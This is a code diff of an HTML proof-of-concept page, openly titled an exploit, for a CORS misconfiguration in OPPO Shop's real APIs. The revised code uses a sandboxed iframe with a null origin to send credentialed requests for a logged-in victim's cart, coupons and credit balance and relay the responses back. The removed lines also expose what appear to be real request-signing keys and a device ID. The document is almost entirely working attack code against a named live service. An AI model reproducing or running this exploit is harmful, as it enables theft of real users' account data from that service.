@@ -109,7 +109,7 @@ line-height:1.4;
 <h1>OPPO CORS Exploit Proof of Concept</h1>
 
 <div class="description">
-This PoC demonstrates a CORS misconfiguration allowing authenticated requests to OPPO Shop APIs when opened from a <b>null origin (file://)</b>.
+This PoC demonstrates a CORS misconfiguration allowing authenticated requests to OPPO Shop APIs when executed from a <b>null origin</b>.
 </div>
 
 <button onclick="runExploit()">Run Exploit</button>
@@ -118,25 +118,17 @@ This PoC demonstrates a CORS misconfiguration allowing authenticated requests to
 
 </div>
 
-<script>
+<!-- sandbox iframe -->
+<iframe id="sandboxFrame" sandbox="allow-scripts" style="display:none"></iframe>
 
-const customHeaders = {
-"Content-Type":"application/json;charset=UTF-8",
-"x-web-client-type":"mobile",
-"x-sign":"3HVUaCnfKgkv96/vKFDQ1uj2KC8=",
-"x-requesttime":"1772758692830",
-"x-sign-key":"4iAEb620alQ8s8c8ss8o0K8sS",
-"x-biz-appkey":"TZeSXfQXxrCyjhvARaVrmw",
-"x-app-deviceid":"52c4b8449f2f5509808568b8d7f917e9",
-"disableenvelope":"true"
-};
+<script>
 
 function createCard(title,label,url){
 
 let card=document.createElement("div")
 card.className="card"
 
-card.innerHTML =
+card.innerHTML=
 '<div class="label '+label+'">'+title+'</div>'+
 '<div class="url">'+url+'</div>'+
 '<div class="status" id="'+label+'_status">Waiting for request...</div>'+
@@ -170,50 +162,62 @@ createCard(
 "https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
 )
 
-function request(url,label){
+
+window.addEventListener("message",function(e){
+
+let data=e.data
+
+if(!data.label) return
+
+document.getElementById(data.label+"_status").innerText="STATUS: "+data.status
+document.getElementById(data.label+"_data").innerText=data.body
+
+})
+
+
+function runExploit(){
+
+let iframe=document.getElementById("sandboxFrame")
+
+let exploitCode = `
+<script>
+
+function send(url,label){
 
 fetch(url,{
 method:"GET",
-credentials:"include",
-headers: customHeaders
+credentials:"include"
 })
 
-.then(r=>{
-document.getElementById(label+"_status").innerText="STATUS: "+r.status
-return r.text()
-})
+.then(r=>r.text().then(t=>{
 
-.then(data=>{
-document.getElementById(label+"_data").innerText=data
-})
+parent.postMessage({
+label:label,
+status:r.status,
+body:t
+},"*")
 
-.catch(err=>{
-document.getElementById(label+"_data").innerText=err
+}))
+
+.catch(e=>{
+parent.postMessage({
+label:label,
+status:"error",
+body:e.toString()
+},"*")
 })
 
 }
 
-function runExploit(){
+send("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list","cart")
+send("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount","count")
+send("https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1","coupon")
+send("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit","credit")
 
-request(
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-"cart"
-)
+<\/script>
+`
 
-request(
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-"count"
-)
-
-request(
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-"coupon"
-)
-
-request(
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-"credit"
-)
+iframe.srcdoc = exploitCode
 
 }
 
